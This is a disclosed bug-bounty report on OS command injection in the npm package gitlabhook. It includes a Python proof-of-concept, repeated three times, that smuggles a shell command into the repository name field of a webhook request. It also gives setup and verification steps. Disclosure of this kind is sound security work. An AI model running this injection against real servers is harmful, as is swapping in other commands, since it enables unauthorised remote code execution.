# gitlabhook OS Command Injection

## Report Details
- **Report ID**: 685447
- **URL**: https://hackerone.com/reports/685447
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-08-31T09:18:46.360Z
- **Disclosed**: 2019-09-13T10:37:00.269Z

## Reporter
- **Username**: samlyhin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report OS Command Injection in gitlabhook.
It allows execution of arbitrary code on the remote server, that waits for instructions from gitlab.

# Module

**module name:** gitlabhook 
**version:** 0.0.17
**npm page:** `https://www.npmjs.com/package/gitlabhook`

## Module Description

This is an easy to use nodeJS based web hook for GitLab.

## Module Stats

[5] downloads in the last week

# Vulnerability

## Vulnerability Description

Function "ExecFile" at line 146 executes commands without any sanitization. User input gets passed directly to this command. 

## Steps To Reproduce:

An exploit on python3 was created. 

```
#!/usr/bin/python

import requests

target = "http://192.168.126.128:3420"
cmd = r"touch /tmp/poc.txt"
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print "Done."
```

Please follow these steps:
1.   Create a temporary directory on the filesystem. mkdir /tmp/temp cd /tmp/temp
2.   Install the module: npm install gitlabhook
3.    Change directory: cd node_modules/gitlabhook/
4.    Run the application: node gitlabhook-server.js

At step 4, you should see that the server is up and running. It should send a big message to the terminal, and this message should finish with the line:

```
listening for github events on 0.0.0.0:3420
```

This server was set up on Kali Linux machine. This machine has an interface with IP address 192.168.126.128.

I have another machine on Windows, that can reach this Kali Linux machine by the above IP. This Windows machine has python3 installed, and python requests module installed too.

So, edit the exploit and run it.

```
#!/usr/bin/python

import requests

target = "http://192.168.126.128:3420" #put target IP and port here
cmd = r"touch /tmp/poc.txt" #a command to execute
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print ("Done.")
```

The exploit above should create a file /tmp/poc.txt on the victim server.

So, on the Kali machine, run the next command:

```
ls /tmp/poc.txt
```

And ensure that the file was created.

Also it's possible to check this vulnerability without usage of additional windows machine. The above exploit may be run on Kali Linux machine:

exploit.py:

```
#!/bin/python3

import requests

target = "http://127.0.0.1:3420" #put target IP and port here
cmd = r"touch /tmp/poc.txt" #a command to execute
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print ("Done.")
```
run it:

```
chmod 755 exploit.py
pip3 install requests
python3 exploit.py
```

and check the result with the following command:
```
ls /tmp/poc.txt 
```

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker can achieve Remote Code Execution (RCE) without any conditions.

## Attachments
No attachments
